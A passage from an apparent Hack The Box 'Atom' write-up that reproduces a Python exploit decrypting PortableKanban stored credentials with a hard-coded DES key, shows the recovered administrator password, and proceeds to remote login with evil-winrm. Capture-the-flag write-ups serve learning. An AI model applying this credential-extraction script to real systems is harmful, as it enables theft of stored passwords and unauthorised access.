# Software Link: https://www.softpedia.com/get/Office-tools/Diary-Organizers-Calendar/Portable-Kanban.shtml
# Version: Tested on: 4.3.6578.38136. All versions that use the similar file format are likely vulnerable.
# Tested on: Windows 10 x64. Exploit likely works on all OSs that PBK runs on. 

# PortableKanBan stores credentials in an encrypted format
# Reverse engineering the executable allows an attacker to extract credentials from local storage
# Provide this program with the path to a valid PortableKanban.pk3 file and it will extract the decoded credentials

import json
import base64
from des import * #python3 -m pip install des
import sys

def decode(hash):
	hash = base64.b64decode(hash.encode('utf-8'))
	key = DesKey(b"7ly6UznJ")
	return key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8')

print("{}:{}".format("Administrator",decode("Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi")))
```

Then install the required libraries and run it

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ python3 -m pip install des
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ python3 49409.py 
Administrator:kidvscat_admin_@123
```

Now we can use `evil-winrm`:

![[Pasted image 20210626132335.png]]

And grab the flag:

![[Pasted image 20210626132407.png]]

That's the box!

![[Pasted image 20210626132511.png]]

And here is the matrix rating I gave it:

![[Pasted image 20210626132540.png]]